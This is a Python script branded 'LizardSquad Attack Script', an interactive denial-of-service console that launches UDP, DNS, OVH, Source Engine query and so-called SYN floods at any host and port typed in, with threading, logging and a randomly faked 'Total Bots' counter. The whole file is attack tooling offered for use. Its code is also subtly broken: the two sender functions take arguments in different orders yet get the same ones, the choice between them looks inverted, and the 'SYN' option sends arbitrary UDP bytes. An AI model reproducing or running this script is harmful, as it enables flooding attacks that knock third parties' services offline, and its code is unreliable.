import os
import sys
import socket
import time
import threading
import random
import logging

# Set up logging
logging.basicConfig(filename='lizard.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global Variables
max_concurrent_attacks = 5  # Set a limit on concurrent attacks
running_attacks = 0  # Track running attacks
nicknm = "LizardSquad"  # Nickname for the bot

# Function for logging attack start and end
def log_attack(action, attack_type, host, port, duration):
    logging.info(f"{action} {attack_type} attack on {host}:{port} for {duration} seconds.")

# Random sender function for attack
def randsender(host, timer, port, punch):
    global running_attacks

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    while time.time() < timeout:
        sock.sendto(punch, (host, int(port)))

    with threading.Lock():
        running_attacks -= 1

# Standard sender function for UDP flood attack
def stdsender(host, port, timer, payload):
    global running_attacks

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    while time.time() < timeout:
        for _ in range(8):  # Send multiple payloads for intensity
            sock.sendto(payload, (host, int(port)))

    with threading.Lock():
        running_attacks -= 1

# Main interaction loop
def main():
    global running_attacks

    while True:
        bots = random.randint(32500, 41500)
        sys.stdout.write(f"\x1b]2;{nicknm} | Active Attacks: [{running_attacks}] | Total Bots: [{bots}]\x07")
        
        user_input = input(f"\033[32m[\033[35m{nicknm}\033[32m@{nicknm}]\033[36m$ \033[96m").lower()
        
        # Command parsing
        command = user_input.split(" ")[0]
        
        if command in ["clear", "cls", "?"]:
            os.system("clear")
            print(banner)
            continue
        
        elif command == "help":
            print("Available commands:")
            print("std <host> <port> <duration> - Launch a standard UDP flood attack.")
            print("dns <host> <port> <duration> - Launch a DNS flood attack.")
            print("ovh <host> <port> <duration> - Launch an OVH attack.")
            print("vse <host> <port> <duration> - Launch a Source Engine Query attack.")
            print("syn <host> <port> <duration> - Launch a SYN flood attack.")
            print("exit - Exit the script.")
            continue

        if command in ["std", "dns", "ovh", "vse", "syn"]:
            if running_attacks >= max_concurrent_attacks:
                print("\033[97mMaximum concurrent attacks reached. Please wait.")
                continue
            
            try:
                _, host, port, timer = user_input.split(" ")
                port = int(port)
                timer = float(timer)
                socket.gethostbyname(host)  # Resolve host

                # Determine payload based on command
                payloads = {
                    "std": b"\x73\x74\x64\x00\x00\x00\x00\x00",
                    "dns": b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00",
                    "ovh": b"\x00\x02\x00\x2f",
                    "vse": b"\xff\xff\xff\xffTSource Engine Query\x00",
                    "syn": b"\x58\x99\x21\x58\x99\x21" * 10
                }
                
                # Start the attack in a new thread
                threading.Thread(target=stdsender if command != "std" else randsender,
                                 args=(host, timer, port, payloads[command])).start()
                log_attack("Launched", command.upper(), host, port, timer)
                print("\033[97mYour Attack Has Been Launched!")
                running_attacks += 1
            
            except ValueError:
                print("Invalid command format. Please use: <command> <host> <port> <duration>")
            except socket.gaierror:
                print("\033[91mInvalid Host!")
            except Exception as e:
                print(f"\033[91mError: {str(e)}")
        
        elif command == "exit":
            print("Exiting script...")
            log_attack("Exited", "N/A", "N/A", "N/A", "N/A")
            exit()
        else:
            print("Unknown command. Type 'help' for a list of commands.")

if __name__ == "__main__":
    banner = """
    ==================================
    LizardSquad Attack Script Initialized
    ==================================
    """
    print(banner)
    main()
